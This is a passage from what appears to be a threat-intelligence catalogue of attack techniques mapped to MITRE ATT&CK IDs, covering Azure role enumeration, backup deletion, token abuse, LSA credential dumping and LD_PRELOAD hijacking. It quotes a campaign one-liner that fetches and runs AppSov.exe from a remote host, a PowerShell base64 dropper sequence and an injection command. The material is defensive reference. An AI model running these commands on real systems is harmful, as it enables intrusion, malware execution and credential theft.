a legitimate package and pushes malicious code into it. This is done by
taking over maintainers' or developers' accounts or injecting obfuscated
malicious code into a legitimate open-source project.  
",1,2025-04-23,2025-04-23,,,,,"T1195.002, T1195.001, T1204, T1218, T1499, T1559.002, T1036"
140907eb-c9fb-4330-9d71-656422388b2b,Azure - Gather Role Information,Threat Vectors,clear,"The ""Gather Role Information"" refers to an adversary's effort to enumerate and obtain 
details about roles, role assignments, and the privileges associated with specific 
accounts or applications within Azure Active Directory (AAD) and Azure Resource 
Manager environments. This reconnaissance phase is foundational, setting up future 
attacks by mapping out who can do what within the Azure estate.

#### Example Attack Scenario

An attacker gains access to a compromised low-privilege user account in an Azure tenant. 
Leveraging their access, the adversary initiates API and portal queries to enumerate 
all directory roles, their descriptions, nested role assignments, and identify which 
users or service principals hold elevated privileges (like Global Administrator, 
Application Admin, or Contributor). 

For example, the attacker uses available Microsoft Graph API permissions like `microsoft.directory/roleAssignments/standard/read` 
or `microsoft.directory/directoryRoles/members/read` to extract:
- A listing of all roles within the tenant.
- The users/groups assigned to these roles.
- The service principals and applications with privileged roles.

With this intelligence, the attacker pinpoints accounts with standing access to 
sensitive resources, cloud infrastructure, or the ability to modify security controls. 
This information enables them to focus follow-on attacks (such as phishing, lateral movement, 
privilege escalation, or controlling cloud resources) on the most impactful targets.

#### Attack Goals and Impact

**Attack Goals:**
- **Enumerate privileged accounts:** Learn which identities have administrator or 
other elevated roles.
- **Understand role-based access controls:** Discover which roles are assigned to 
cloud workloads, services, and third-party integrations.
- **Map the privilege model:** Identify paths to escalate privileges or move laterally 
within the tenant.
- **Target specific high-value accounts:** Single out accounts or service principals 
most beneficial for further attack phases.

**Impact:**
- **Precision in follow-on attacks:** Enables highly targeted privilege escalation, 
persistence, or data exfiltration.
- **Facilitates credential theft or misuse:** Attackers concentrate phishing, token theft, 
or abuse on users who can cause maximum damage.
- **Exposure of sensitive information:** Mapping out service principals, applications, 
and their privileges may reveal misconfigurations or vulnerabilities exploitable 
for direct access to business-critical resources.
- **Reduces attacker effort:** By understanding the privilege hierarchy, attackers 
avoid unnecessary noise and maximize their effectiveness.

#### Attack Flow and Methodology

1. **Access Acquisition:**
  - Attacker obtains valid credentials or API access (even with limited privileges) within the Azure tenant.

2. **Role Enumeration:**
  - Uses Microsoft Graph, AzureAD, or Azure Resource Management APIs/portals to 
  list all directory roles (`directoryRoles/standard/read`), their descriptions, 
  and their associated members.
  - Specifically requests assignments (`roleAssignments/standard/read`) and membership 
  lists to correlate identities with roles.

3. **Correlation and Mapping:**
  - Maps users, groups, applications, and service principals to their assigned roles.
  - Correlates admin accounts, app owners, and standing access roles across different 
  Azure resources or subscriptions.

4. **Analysis:**
  - Analyzes output to spot high-privilege accounts (e.g., Global Admin, Owner, Contributor), 
  and applications with dangerous permissions.
  - May additionally search for legacy, orphaned, or misconfigured roles to exploit 
  gaps in security controls.

5. **Preparation for Exploitation:**
  - Prepares to exploit the gathered intelligence, such as launching spear-phishing 
  campaigns specifically targeting privileged users, leveraging known vulnerabilities 
  in third-party applications, or planning lateral movement towards sensitive workloads.
",2,2025-08-05,2025-09-04,,,"{'sequence::preceeds': ['a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b', '61ddc240-e5a6-4ca8-ae77-6b471b498913', 'f1dc4341-eb45-4d07-8075-b1a6b227cc76']}","[ICS] HEXANE, LAPSUS, Volt Typhoon","T1591.004, T1087.002, T1589.001, T1482"
cc7dd57f-8d9e-451f-8ec7-4bb2ad10e96c,Process discovery,Threat Vectors,clear,"A process discovery refers to the process of identifying and analyzing
the running processes on a system or network. This involves gathering
information about the processes, such as their names, IDs, command
lines, and other relevant details ref [1].  

For example, in Windows environment, an adversary could obtain details
on running processes using the Tasklist utility via cmd or `Get-Process`
via PowerShell. Information about processes can also be extracted from
the output of Native API calls such as `CreateToolhelp32Snapshot`
ref [2].  

In Mac and Linux, this is accomplished with the ps command.
The threat actors may also opt to enumerate processes via /proc.

By analyzing the running processes on a system or network, the threat
actors can abuse process discovery functionality in some of the
following ways:  

### Living-off-the-Land (LOTL) techniques to identify potential targets 

The threat actors may abuse native tools (PowerShell, WMIC) to blend
in with normal activity, avoiding suspicion.    

### Used tools by threat actors for process discovery on a target system

#### 1. Tasklist (Windows built-in) 

This command-line tool is used to display a list of currently running
processes on a Windows system. Threat actors might use it to identify
potential targets for exploitation or to understand the system's
configuration.  

#### 2. Process Monitor (SysInternals)

Process Monitor can be used to verify if the browser or other service
is launched on a target system and with what level of privileges. This
tool can monitor what processes are running on the system.      

#### 3. PsExec (SysInternals) 

This tool allows users to execute processes remotely, but it can also
be used to list running processes on a target system. Threat actors
might use PsExec to gather information about the system's processes
without being detected.

#### 4. PowerShell (Windows built-in)

PowerShell is a powerful scripting language that can be used to
automate tasks, including process discovery. Threat actors might use
PowerShell cmdlets like Get-Process to list running processes on a
target system.  

#### 5. Windows Management Instrumentation functionality (Windows built-in)

Threat actors can abuse WMI (Windows Management Instrumentation) filters
in Windows for process discovery. Examples include running WMI queries
(e.g., WMIC) to retrieve information about running processes, Creating
WMI specific event filters to monitor process creation, modification
and other process related information. Threat actors also can utilize
WMI filters to execute queries that retrieve process information,
for example: such as `SELECT * FROM Win32_Process`.  

#### 6. ProcDump (SysInternals)

This tool is designed to capture and analyze process dumps, but it can
also be used to list running processes on a target system. Threat actors
might use ProcDump to gather information about the system's processes and
identify potential vulnerabilities.  

#### 7. Process Explorer (SysInternals)

This tool provides a detailed view of running processes, including their
memory usage, network connections, and system resources. Threat actors
might use Process Explorer to gather information about the system's
processes and identify potential targets for exploitation.  

#### 8. Cygwin or Linux tools (e.g., ps, top, htop)

If the target system has a Unix-like environment installed, threat actors
might use tools like ps, top, or htop to list running processes and gather
information about the system's configuration.  

#### 9. Meterpreter (Metasploit)

Meterpreter is a payload that can be used to exploit vulnerabilities and
gain access to a target system. It includes a range of tools, including
process discovery capabilities, that threat actors can use to gather
information about the system's processes.

#### 10. Cobalt Strike's Process List

Cobalt Strike is a commercial penetration testing tool that includes
a range of features, including process discovery. Threat actors might
use Cobalt Strike to list running processes on a target system and
identify potential targets for exploitation.
",1,2025-02-04,2025-02-04,,,,,T1057
db3cae2f-3e6b-4aed-b346-43686bbb382e,Typosquatting domain attack for disinformation,Threat Vectors,clear,"Typosquatting, also known as URL hijacking, is a form of cyber attack
where an attacker registers a domain name that is very similar to a
legitimate and popular website, often by exploiting common typing
errors or misspellings. This is done to deceive users into visiting
the fake domain, usually with the intention of spreading disinformation,
stealing personal information, or installing malware ref [1].  

In the context of disinformation, typosquatting can be used to create
a fake version of a trusted news source or government website in order
to spread false or misleading information. By exploiting users' trust
in familiar domain names, attackers can manipulate public opinion,
confusion, and undermine the credibility of legitimate sources.  

Threat actors can impersonate domains in different ways.

Some of them are:

- A common misspelling of the target domain (example: CSOnline.com rather than CSOOnline.com)
- A different top-level domain (example: using .uk rather than .co.uk)
- Combining related words into the domain (CSOOnline-Cybersecurity.com)
- Adding periods to the URL (CSO.Online.com)
- Using similar looking letters to hide the false domain (ÇSÓOnliné.com)

Typosquatting is a lookalike domain with one or two wrong or different
characters with the aim of trying to trick people onto the wrong webpage.

The threat actors can buy and use a domain only with a little change
compared to the legitimate and official site of some service.
It can be difficult for the end user to recognise the difference, for
example between goggle.com and google.com or google.com written with
similar character for the character ""o"" but actually from different
UTF encoding system. It can looks like a well known and legit
domain but to be actually a malicious one with a very close name.

In some of the cases regarding the security reports typosquatting
domain attack is used in malicious campaigns for disinformation.
For example, Doppelganger is a pro-Russian misleading information
operation targeting the European Union (EU) and other geopolitical
actors. This campaign exploits political, economic, and social
divisions within the EU and its member states. 
",1,2025-01-09,2025-01-09,,,{'sequence::preceeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df']},"[Enterprise] APT29, UNC2452, [Mobile] APT28, APT28, [ICS] APT38, Lazarus Group, [ICS] FIN7, FIN7",T1583.001
490a5d5d-5880-45bd-a05d-176878e0ae24,Azure DevOps pipelines,Threat Vectors,clear,"Azure DevOps pipelines are a critical component in modern software development but 
also present significant attack surfaces for threat actors. Key threats include 
supply chain compromises, insider attacks, privilege escalation vulnerabilities, 
and misconfigurations that can lead to unauthorized access, data breaches, and malicious 
code execution.

## Comprehensive Threat Vectors for Azure DevOps Pipelines

### Supply Chain Attacks
- **Malicious Extensions and Tasks:** Attackers may upload harmful extensions to 
the Azure DevOps Marketplace, which can execute arbitrary code if installed and 
run in pipelines.
- **Compromised Build Agents:** Outdated or unpatched build agents can be exploited 
to gain persistent access or execute malicious code within pipelines.
- **Dependency Poisoning:** Malicious code can be injected into package dependencies 
(e.g., NuGet, npm, Maven), which are then pulled and executed during pipeline builds.
- **Third-Party Tool Integrations:** Compromised integrations or plugins can introduce 
vulnerabilities into the pipeline execution environment.

### Insider Threats
- **Unauthorized Pipeline Modifications:** Users with access can alter pipeline 
YAML files or scripts to introduce malicious code, especially if branch protections 
are weak or absent.
- **Token Abuse:** Attackers can abuse pipeline job tokens (e.g., swapping short-term 
for persistent tokens via vulnerabilities like CVE-2025-29813) to escalate privileges 
or access sensitive resources.
- **Malicious Code Injection:** Insiders might inject malicious scripts or commands 
during pipeline runs, potentially bypassing code reviews if pull requests are not 
enforced.

### Credential and Secret Exposure
- **Hardcoded Secrets:** Storing API keys, passwords, or tokens directly in pipeline 
scripts or configuration files can lead to exposure if logs are not properly secured.
- **Leaked Logs:** Pipeline logs may inadvertently contain sensitive information 
if proper masking and filtering are not enforced.
- **Forked Repositories:** Secrets in pipelines can be exposed if pipelines run 
on forked repositories, especially if pull requests are not properly secured.
- **Insufficient Secret Rotation:** Failing to regularly rotate secrets increases 
the risk of exploitation if credentials are compromised.

### Network and Access Control Weaknesses
- **Unrestricted Network Access:** Lack of IP allowlisting or network security groups 
(NSGs) can allow attackers to access pipeline resources from untrusted locations.
- **Weak Authentication:** Using personal access tokens (PATs) instead of OAuth 
or managed identities can increase the risk of credential theft.
- **Insufficient Role-Based Access Control (RBAC):** Overprivileged users or service 
accounts can lead to unauthorized actions or data exfiltration.
- **Lack of Isolation:** Pipelines not isolated from each other or from sensitive 
resources can enable lateral movement within the environment.
",3,2025-06-19,2025-09-08,,,"{'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149', '2900d389-3098-49d3-8166-5b2612d03576', 'bb2501d5-99c7-44a6-ac5a-9510102d6611']}",,"T1190, T1528, T1078, T1195.001"
1962f0c7-2f2f-4b4c-bab0-733af8033595,New Windows access token creation,Threat Vectors,clear,"A Windows access token is a data structure that contains information
about a user's security context, including their security identifier
(SID), group membership, privileges, and other security-related
information. When a user logs in, the system generates an access
token for them. A threat actor may create such access token on
behalf of the Windows user and to use it to access system resources
or to escalate privileges for further access or lateral movement
ref [1].    

### Windows access token creation steps

The access token creation process in Windows involves
the following steps:

- The Local Security Authority (LSA) validates the user's
credentials (e.g., username and password).
- The LSA creates a security database entry (SDBE) for the user.
- The LSA generates an access token for the user based on the SDBE
and the user's security context.
- The LSA attaches the access token to the user's logon session.

### Abuse of Windows API functions to create an access token

A threat actor can use the native Windows API functions to manipulate
the access token, such as `DuplicateToken`, `CreateProcessAsUser`,
`CreateRestrictedToken` and `SetThreadToken`. 

`CreateRestrictedToken` API  creates a version of an existing token
with reduced privileges by stripping out certain rights.

By manipulating these functions, the attacker can create a new token
with elevated privileges or mimic another user's token ref [3].    

### Usage of runas commands

Threat actors can use a set of runas commands to generate a new user's
access tokens and to use it on behalf on a legitimate user ref [a, 3].  

Example:

`runas /user:domain\administrator cmd`

The adversaries commonly use user's token to elevate their security
context from the administrator level to the SYSTEM level. An adversary
can use a token to authenticate to a remote system as the account for
that token if the  account has appropriate permissions on the remote
system. 

### Known toolset used by the threat actors

- Mimikatz
- Windows API (WinAPI)
- PowerShell
- Windows Token Manager (WNTM)
- Cobalt Strike
- Metasploit
- Windows Internal Database (WID)
- Token Universe tool, ref [4] 
",1,2025-02-19,2025-02-27,,,"{'sequence::succeeds': ['349348ca-66f5-41d2-8610-6bb61556d773', '2404055a-10f8-4c50-9e9b-0f26756e7838']}","FIN6, [ICS] FIN6, Gelsemium, FIN13, [Enterprise] FIN13",T1134.003
a3df7d01-5fd9-4522-8eaf-f28895046b7d,Obfuscate binaries through PowerShell commands,Threat Vectors,clear,"Obfuscating binaries through PowerShell commands is a technique
used to make it difficult for reverse engineers, malware analysts,
or security researchers to understand the purpose and behavior of
a binary or script. This is often used by attackers to evade
detection and analysis.  

### Some of the methods for binary obfuscation

- ConvertTo-Base64: Converts a string to a Base64-encoded string.
- Compress-Archive: Compresses a file or folder using Gzip.
- Invoke-Expression: Executes a string as a PowerShell expression,
allowing for dynamic code execution.
- Add-Type: Loads a .NET assembly, which can be used to execute
code dynamically.
- Reflection.Assembly: Loads a .NET assembly using reflection.

For more information, an examples are given in the ref [2], [3], [4].

### A process for base64 encoded binary 

Usually a base64 encoded binary dropped to a computer is achieved
via a sequence of PowerShell (PS) commands.

An example for such pattern is represented in several steps below:

1. Base64 encoding

Like a first step, a binary (an executable file, for instance) is encoded 
in base64. This encoding scheme is used to represent binary data in an ASCII
string format. This is often done to bypass security controls that might
block or inspect binary data but allow text.

2. Dropping the encoded binary

The base64 encoded string is then ""dropped"" onto the target computer.
This could be done through various means, such as being embedded in a script,
sent via email, or included in a malicious document that executes PowerShell
commands when opened.

3. Decoding the binary in PowerShell

Once the encoded string is on the target system, PowerShell can be used to
decode it. The [System.Convert]::FromBase64String() method in PowerShell is
used for this purpose.

Example for PowerShell obfuscation code

```
encodedString = ""YOUR_BASE64_ENCODED_STRING_HERE""
$decodedBytes = [System.Convert]::FromBase64String($encodedString)
```

4. Saving the decoded Binary to a file

After decoding, the binary needs to be saved to a file. This can
be done using the [System.IO.File]::WriteAllBytes() method:

```
$path = ""C:\Path\To\Save\YourFile.exe""
[System.IO.File]::WriteAllBytes($path, $decodedBytes)

```
5. Executing the binary

Finally, the saved binary can be executed. One of the methods in which
the threat actors can do this is directly from PowerShell or through
other means such as creating a shortcut or using other scripts.

Example:

```
Start-Process -FilePath $path
```

 Another example for binary obfuscation through PowerShell commands
 is shown in Chinese-linked cluster threat actor campaign ref [1].  
 
 The threat actor group is observed to obfuscate binaries (in particular
 AppSov.exe) using PowerShell commands.  

 The threat actor deployed AppSov.exe by executing a PowerShell command
 that performs the following actions:

 - A threat actor downloads a binary file named from a remote endpoint
 using the utility curl.exe
 - After they save the downloaded file as `AppSov.exe` in the
 `C:\ProgramData\` directory.
 - Launches the executable using the `Start-Process` PowerShell command.
 - System reboot after some period of time. ref [1].      

 An example for used command:

 ```
 sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
 
 ```
",1,2025-06-12,2025-06-18,,,,,"T1190, T1027.013, T1027.002, T1059.001"
09b9aee8-3849-4578-8243-17157d6d54e0,Windows credential creation attempt,Threat Vectors,clear,"### Windows Credential Creation Attempt
A Windows credential creation attempt refers to 
activities where a user or system processes aim 
to create, store, or manipulate sets of credentials 
(e.g., username and password) within a Windows 
environment. This can involve legitimate system 
operations or malicious activities by threat actors 
seeking unauthorized access.

#### Examples of Windows Credential Creation Attempt
**User Account Creation:**

- Using administrative command-line tools such as 
`net user` to add new user accounts.
- Leveraging PowerShell scripts or commands to automate 
the creation of user accounts.
`New-LocalUser`: Create a new local user account with 
`New-LocalUser -Name ""[username]""` 
`-Password (ConvertTo-SecureString ""[password]""` 
`-AsPlainText -Force)`.

**Abuse of Winlogon:**  

Winlogon.exe is responsible for managing secure user 
interactions during logon. Threat actors can exploit 
this process to pass harvested credentials to the 
Local Security Authority (LSA), thereby impersonating 
legitimate users.

**Saved Passwords in Credential Manager:**  

Threat actors can exploit stored credentials in the 
Windows Credential Manager. These credentials can be 
used to automatically log into various services or 
create new user accounts using the gathered information.

**Credential Injection:**  

Using tools or scripts to inject credentials directly 
into the Windows Security Accounts Manager (SAM) 
database or LSA to create or modify credentials.

**Known Tools for Credential Creation and Manipulation**

- **Windows Credential Editor (WCE):** 
WCE is a tool capable of listing logon sessions and 
modifying associated credentials, such as adding or 
changing NTLM hashes, plaintext passwords, and 
Kerberos tickets. It can be misused to create unauthorised 
credentials on a Windows system.
",1,2025-02-10,2025-02-14,,,{'sequence::succeeds': ['444e014f-d830-4d0d-9c2e-1f76d80ba380']},"WIZARD SPIDER, [ICS] Wizard Spider, LAPSUS, [Mobile] LAPSUS$","T1078, T1552.001, T1003, T1078.003, T1136, T1550.004"
99c78650-8e19-4756-90fb-2573242577ca,Mobile device compromised by spyware app,Threat Vectors,clear,"Earlier versions of spyware apps were installed on smartphones through vulnerabilities
in commonly used apps, or involving an SMS or iMessage that provides a link to a website. 
If clicked, this link delivers malicious software that compromises the device.
It can also be installed over a wireless transceiver located near a target,
or manually if attacker can steal the phone that has been targeted.  

Since 2019, attackers have been able to install spyware on smartphones with a missed call on WhatsApp,
including delete the record of the missed call, making it impossible for the owner to know anything is amiss.
Another way is by simply sending a message to a phone that produces no notification.  

In the latest versions of spyware does not require the user to do anything. All that is required for a
successful spyware attack and installation is having a particular vulnerable app or OS installed on the device,
such as vulnerabilities in the iMessage service in iPhones which allows for infection by simply receiving a message.
This is known as a zero-click exploit.     

Once installed, spyware malware can theoretically harvest any data from the device and transmit
it back to the attacker. It can steal photos and videos, recordings, location records, communications,
web searches, passwords, call logs and social media posts.
It also has the capability to activate cameras and microphones for real-time surveillance
without the permission or knowledge of the user.  
",2,2022-09-12,2025-10-01,,,,"[Enterprise] MuddyWater, MuddyWater","T1512, T1582, T1513, T1517, T1429, T1643"
444e014f-d830-4d0d-9c2e-1f76d80ba380,Windows credential dumping through Local Security Authority (LSA) Secrets,Threat Vectors,clear,"Adversaries may attempt to dump credentials to obtain account login
and credentials details, using techniques for Local Security Authority 
(LSA) Secrets dumping. If the attacker has a System access to the host 
this may lead to access LSA secrets database. Local Security Authority
contains credential information related to local and domain based accounts. 
The Registry is used to store the LSA secrets. When services are run under 
the context of local or domain users, their passwords are stored in the 
Registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets. If auto-logon is 
enabled, this information will be stored in the Registry as well. 
The extracted passwords are UTF-16 encoded, which means that they 
are returned in plaintext. LSA secrets can also be dumped from memory.

Known tools used for LSA credential dumping:

- pwdumpx.exe
- gsecdump
- Mimikatz
- secretsdump.py
- reg.exe (execution file extracts information from the Registry)
- Creddump7 (for gathering of credentials)

Executed commands and arguments that may access to a host may attempt to 
access Local Security Authority (LSA) secrets. Remote access tools may contain 
built-in features or incorporate existing tools like Mimikatz. PowerShell scripts
also can contain credential LSA dumping functionality.",2,2022-11-04,2025-10-01,,,,,"T1003, T1003.004"
f2c59a8e-3b1f-4a99-80f0-3675b8c1f184,GoGra backdoor,Threat Vectors,clear,"GoGra or also known as Trojan.Gogra is a newly discovered backdoor,
deployed against a media organization in South Asia in November 2023.
Written in Go, it uses the Microsoft Graph API to communicate with a
Command and Control server hosted on Microsoft mail services ref [1].  

Its authentication is managed via OAuth access tokens. GoGra is configured
to read messages from an Outlook account with the username ""FNU LNU"" whose
subject line begins with ""Input"". It decrypts the content using AES-256 in
Cipher Block Chaining (CBC) mode, with a specific key. The malware can
execute commands via cmd.exe and supports a ""cd"" command to change
directories ref [1, 3].        

After the command execution, the output is encrypted and sent back to the
Outlook account with the subject ""Output"". GoGra is believed to be
developed by a nation-state-backed group known for targeting South Asian
organizations.      

GoGra is functionally similar to another known tool used by the same threat
actor called Graphon, written in .NET. Aside from the different programming
languages used, Graphon is using a different AES key and didn't contain an
extra “cd” command as well as haven't a hardcoded Outlook username to
communicate with. The username instead is received directly from the
C&C server ref [3].  
",1,2023-10-15,2023-10-15,,,{'sequence::preceeds': ['06523ed4-7881-4466-9ac5-f8417e972d13']},,"T1134, T1027, T1059.003, T1204.002"
4d0bd987-1430-4433-9b58-a71ba8798435,Abuse of environment variable to hijack library functions,Threat Vectors,clear,"This threat vector focuses on the malicious use of the `LD_PRELOAD` environment 
variable on Linux systems to hook or hijack library function calls. Attackers, 
Red Teams, and advanced persistent threats leverage this trick to intercept and 
modify the behavior of dynamically linked libraries before the legitimate 
functions are called. By loading a rogue or malicious library via `LD_PRELOAD`, 
adversaries can achieve elevated privileges, persist on the target, and run 
arbitrary code under the guise of otherwise legitimate processes.    

Scenario example: 
- An attacker already possessing local or remote administrative access to a Linux 
host can set or modify the `LD_PRELOAD` environment variable in order to inject 
custom libraries during program execution.   

- When an application starts, the system dynamic linker reads the `LD_PRELOAD` variable 
and forces the loading of the malicious library.  

- The malicious library intercepts and potentially manipulates function calls—such as 
file I/O or network operations—allowing attackers to subvert security controls or 
execute code of their choice.

```bash
LD_PRELOAD=/tmp/malicious.so /usr/bin/anyApp
```

This indicates that a potentially unauthorized library (`/tmp/malicious.so`) is being 
force-loaded into `anyApp`.  
",1,2025-01-10,2025-01-10,,,,"[Enterprise] TeamTNT, TeamTNT, [Enterprise] APT37, APT37",T1574.006
2c6058fb-21db-47fe-99bc-a07cb70c53e4,Azure - Backup Delete,Threat Vectors,clear,"The following threat vector involves adversaries deleting backup data from Recovery 
Services Vaults, potentially crippling recovery efforts after a compromise. 

## Example Attack Scenario
Adversaries enumerates available Recovery Services Vaults, discover active backup 
items (e.g., VMs, databases), and execute a ""Stop Protection and Delete Backup Data"" 
operation. If soft delete is not enabled, or the feature is disabled (potentially 
by compromising Resource Guard or Multi-User Authorization controls), all backup 
data is permanently deleted, leaving no recourse for recovery. In more advanced 
attacks, the attacker may seek to disable soft delete or reduce retention windows 
before initiating full backup deletion to maximize the impact.

## Attack Goals and Impact
- **Goals:** The primary goal is to **destroy backup copies** so that critical systems 
and data cannot be restored after ransomware encryption, destructive attacks, or 
other forms of compromise.
- The attacker may use this method to put added pressure in ransomware attempts, 
making recovery impossible unless a ransom is paid.
- Organizations are left without operational recovery points, leading to prolonged 
outages, potential data loss, financial impact, and reputational harm.
- Disabling ""soft delete"" or tampering with backup retention extends the risk, as 
it eliminates the safety buffer against accidental or malicious deletion.

## Attack Flow and Methodology

1. List all Recovery Services Vaults and enumerate protected items (VMs, SQL databases, 
file shares, etc.) in the Azure environment.
2. Elevate privileges if needed to gain backup operator or owner roles, sometimes 
by disabling RBAC/MFA controls.
3. - Attempt to disable or reduce protection features such as ""Soft Delete"" or retention 
  policies—sometimes by also compromising Resource Guard if Multi-User Authorization 
  is used.
  - Review or manipulate policies to enable immediate deletion.
4. - Execute ""Stop Protection and Delete Backup Data"" commands via the Azure portal, 
CLI, PowerShell, REST API, or through automation scripts.
  - If soft delete is active, data only moves into a soft-delete state (usually 
  14 days retention) and can be restored within that time.
5. Attempt to remove items from even the soft-delete state if possible. Some attacks 
target disabling soft delete (if accessible); after the retention period, deleted 
data is permanently lost.
6. All recovery points are lost, blocking simple system and data restores and maximizing 
the attack impact. The victim organization must resort to slower, less effective, 
or non-existent recovery measures.
",1,2025-09-04,2025-09-04,,,"{'support::enabled': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d', '140907eb-c9fb-4330-9d71-656422388b2b', '2900d389-3098-49d3-8166-5b2612d03576', '10a89280-d42e-446d-9f8d-840b1218f532']}","WIZARD SPIDER, Sandworm, [Enterprise] BlackByte","T1485, T1485.001, T1561"
54adba8e-e3f8-43e2-bcd5-7c3cd61112d9,Create a process with a token,Threat Vectors,clear,"Adversaries may create a new process with a different token 
to escalate privileges and bypass access controls. A processes 
can be created with the token and resulting security context 
of another user using features such as CreateProcessWithTokenW 
and runas.

An adversary creates a new access token with DuplicateToken(Ex) 
and uses it with CreateProcessWithTokenW to create a new process 
running under the security context of the impersonated user. 
This is useful for creating a new process under the security 
context of a different user.
",1,2022-08-04,2022-08-04,,,,,T1134.002
4472e2b0-3dca-4d84-aab0-626fcba04fce,Pass the hash attack to elevate privileges,Threat Vectors,clear,"Elevating privileges on Windows to System allows a threat actor (or 
sysadmin) to do things that are not possible without SYSTEM/root 
privileges.

Pass the hash is a method of authenticating as a user, without having 
access to the user's cleartext password, by stealing password hashes and 
using this password hash to authenticate directly to a resource via a 
third party non-Microsoft tool such as Mimikatz. This method bypasses 
standard authentication steps that require a cleartext password, moving
directly into the portion of the authentication that uses the password 
hash.

Mimikatz sekurlsa module without the /impersonate option implements the standard
pass-the-hash technique, which works by authenticating to a resource, by in the 
background spawning a new process in the context of the hash and attacker-
desired elements. For examples, see the reference to thehacker.recipes.
",1,2022-11-17,2024-05-15,,,,"[Mobile] APT28, APT28, [Enterprise] APT1, APT1, [Enterprise] APT32, APT32, [Enterprise] Chimera, [Enterprise] GALLIUM, GALLIUM, [Enterprise] Kimsuky, TA406",T1550.002
d5039f2c-9fcc-4ba3-ad6a-da8c891ba745,Abuse of Windows Utilities,Threat Vectors,clear,"Advanced threat actors frequently abuse legitimate Windows utilities to execute 
malicious code, evade detection, and maintain persistence. This technique, known 
as Living off the Land Binaries (LoLBins), leverages trusted applications to 
carry out unauthorized actions.",1,2024-10-30,2024-10-30,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [ICS] APT38, Lazarus Group","T1218, T1197, T1218.004, T1563, T1140, T1218.010, T1218.005"
394dde97-4a8c-4b6a-8f8b-c6bf18a7a87f,Azure - Port Mapping,Threat Vectors,clear,"Port mapping in Azure refers to the process of exposing internal ports of virtual 
machines (VMs), containers, or services to external networks, often through Azure 
Load Balancers, Network Security Groups (NSGs), or NAT rules. This allows external 
users or services to access resources inside a private Azure network by mapping 
public ports to private ones.

### How Port Mapping Can Be a Threat Vector

Port mapping, if misconfigured or left unsecured, can introduce several security risks:

- **Exposure of Internal Services:** Mapping internal ports to public endpoints 
can expose services (e.g., RDP, SSH, HTTP) to the internet, making them targets 
for scanning, brute-force attacks, and exploitation of vulnerabilities.
- **Reconnaissance by Attackers:** Attackers can enumerate open ports by analyzing 
NSG rules or scanning Azure IP ranges, identifying which services are accessible 
and potentially vulnerable.
- **Misconfigured NSGs:** If NSGs are not properly configured, they may inadvertently 
allow unrestricted access to sensitive ports, increasing the attack surface.
- **Bypassing Security Controls:** Using non-standard port mappings 
(e.g., mapping RDP 3389 to a random high port) may provide slight obscurity but 
does not prevent targeted attacks, especially if attackers scan all ports.
- **Container and VM Risks:** Improper port mapping in Azure container services 
or VMs can lead to exposure of management interfaces or application endpoints, increasing 
the risk of unauthorized access or lateral movement within the environment.

### Common Attack Scenarios

- **Brute Force Attacks:** Exposed RDP (3389) or SSH (22) ports are frequent targets 
for automated brute-force attempts.
- **Service Exploitation:** Attackers may exploit known vulnerabilities on exposed 
ports, especially if services are outdated or unpatched.
- **Information Gathering:** Attackers use port mapping information to build a profile 
of the environment, identifying potential entry points for further attacks.
",3,2025-07-10,2025-09-08,,,"{'support::enabled': ['4e7eae8e-6615-41f2-bfe1-21a04f7a6088', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1190, T1078, T1110"
f3a392f7-3268-4c54-8bfa-8117b784f520,DLL Execution over Rundll32,Threat Vectors,clear,"Rundll32.exe is a powerful asset for adversaries to proxy execution of arbitrary
and malicious code. It is flexible and efficient for loading code into memory,
as may load malicious DLLs by ordinals, function names or directly.
Rundll32.exe has a certain degree of trust; which can result in a possible
AppLocker and Software Restriction Policies (SRP) bypass.

Adversaries rely on distinct vectors to infect their targets, who might get
infected. Upon successful exploitation, malicious actors have been seen executing
DLL files using Rundll32.exe for multiple purposes; such as download and execute a
payload from a remote server (DLL path could be both local and remote when the DLL
is hosted on a SMB share using UNC paths), contact C&C server to upload stolen data
or dump LSASS process memory to obtain credentials.
",2,2023-07-25,2025-10-01,,,,"[Mobile] APT28, APT28, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] HAFNIUM, HAFNIUM, [Enterprise] Magic Hound, TA453, [Enterprise] Blue Mockingbird, [Enterprise] MuddyWater, MuddyWater, [Enterprise] TA505, TA505",T1218.011
c856d1b5-b351-49ad-b8f4-8ab9720ba510,Azure - Storage blobs data collection,Threat Vectors,clear,"The threat vector refers to techniques used by attackers to discover, enumerate, 
and exfiltrate data from Azure Blob Storage containers, often due to misconfigurations 
that allow unauthorized or public access to sensitive data. This is commonly known 
as ""blob hunting"" and is a significant risk for organizations using cloud storage.

## Attack Techniques

### 1. Blob Hunting and Enumeration

- **Blob Hunting**: Attackers attempt to discover Azure storage accounts, containers, 
and blobs by guessing or brute-forcing names, leveraging predictable naming conventions, 
or using automated tools such as MicroBurst and BlobHunter.
- **Enumeration Process**:
  - **Storage Account Discovery**: Attackers identify potential storage account 
  names, often using subdomain enumeration or company naming conventions (e.g., `companyname.blob.core.windows.net`).
  - **Container Enumeration**: Once the account is found, attackers guess or enumerate 
  container names, which are often generic (e.g., ""images"", ""backups"").
  - **Blob Listing**: If a container allows anonymous access, attackers can list 
  and access all blobs within it, potentially exposing sensitive files.

### 2. Exploiting Misconfigurations

- **Public Access Settings**:
  - **Private Access**: Only authorized users can access data (most secure).
  - **Blob Access**: Anyone with the blob URL can access the data, but cannot list 
  all blobs.
  - **Container Access**: Anyone can list and access all blobs in the container, 
  if they know the container name.
- Attackers exploit misconfigurations where containers are set to ""Blob"" or ""Container"" 
access, allowing unauthorized data collection.

### 3. Automated Tools

- **BlobHunter**: Scans Azure blob storage for publicly accessible blobs and reports 
misconfigured containers.
- **MicroBurst**: Automates enumeration and brute-forcing of storage account and 
container names.
- **Legitimate Tools Misused**: Tools like Azure Storage Explorer and AzCopy can 
be used by attackers for bulk data exfiltration if credentials or access are compromised.
